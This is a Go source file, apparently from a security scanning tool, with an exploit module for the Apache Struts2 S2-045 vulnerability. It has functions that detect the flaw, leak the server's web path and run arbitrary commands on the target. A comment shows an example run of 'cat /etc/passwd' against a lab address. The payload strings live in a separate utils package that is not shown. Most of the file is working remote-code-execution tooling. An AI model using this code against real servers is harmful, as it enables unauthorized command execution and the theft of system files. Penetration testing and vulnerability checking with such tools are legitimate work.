package s2_045

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-045/orders --vn 45 --mode exec --cmd "cat /etc/passwd"
*/
func Check(targetUrl string) {
    respString := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.POC_s045_check)
    if utils.IfContainsStr(respString, utils.Checkflag) {
        color.Red("*Found Struts2-045！")
    } else {
        fmt.Println("Struts2-045 Not Vulnerable.")
    }
}
func GetWebpath(targetUrl string) {
    webpath := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.POC_s045_webpath)
    color.Green(webpath)
    
}
func ExecCommand(targetUrl string, command string) {
    respString := utils.PostFunc4Struts2(targetUrl, "", "qwer", utils.POC_s045_exec(command))
    fmt.Println(respString)
}
